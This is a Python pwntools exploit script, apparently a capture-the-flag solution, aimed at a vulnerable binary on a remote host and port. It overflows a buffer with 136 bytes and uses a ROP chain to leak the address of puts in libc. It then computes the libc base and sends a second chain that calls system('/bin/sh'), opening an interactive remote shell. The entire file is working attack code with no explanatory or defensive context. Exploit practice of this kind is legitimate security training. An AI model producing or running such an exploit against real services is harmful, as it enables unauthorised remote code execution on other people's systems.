#!/usr/bin/env python3
from pwn import *
import sys

puts_plt = 0x401080
puts_addr = 0x404018
pop_rdi = 0x00000000004012e3
main_addr = 0x00000000004011B6
ret = 0x40127E

libc = ELF("./libc.so.6")

def main(r):
    r.recvline()
    r.recv()
    payload = b'a' * 136 + p64(pop_rdi) + p64(puts_addr) + p64(puts_plt) + p64(main_addr)

    r.sendline(payload)
    r.recvline()
    data = r.recvline().strip() + b'\x00' * 2
    leak = u64(data)
    libc_base = leak - libc.symbols['puts']
    print(hex(libc_base))

    bin_sh = libc_base + next(libc.search(b'/bin/sh'))
    system = libc_base + libc.symbols['system']

    payload = b'a' * 136 + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)
    r.recvline()
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("[!] Usage: ./sploit.py <host> <port>")
        sys.exit(-1)

    r = remote(sys.argv[1], int(sys.argv[2], 10))
    #r = process('./app')
    main(r)